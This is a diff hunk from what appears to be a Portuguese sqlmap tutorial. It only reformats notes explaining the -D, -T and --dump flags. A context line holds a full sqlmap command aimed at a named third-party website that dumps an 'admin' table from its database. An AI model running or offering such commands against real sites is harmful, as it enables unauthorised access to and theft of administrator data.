@@ -252,8 +252,9 @@ visualizar o conteúdo dela:
 $ python sqlmap.py -u http://www.thailandquitline.or.th/news.php?id=1 -D admin_nd -T admin --dump -v0
 ```
 
-Obs: **-D** *admin_nd* **-T** *admin*, define que queremos trabalhar com a tabela admin da database admin_nd.
-Obs2: com --dump pedidos para o sqlmap nos mostrar o conteúdo desta tabela.
+Obs: **-D** *admin_nd* **-T** *admin*, define que queremos trabalhar com a tabela *admin* da database *admin_nd*.
+
+Obs²: com --dump pedidos para o sqlmap nos mostrar o conteúdo desta tabela.
 
 Resultado:
 
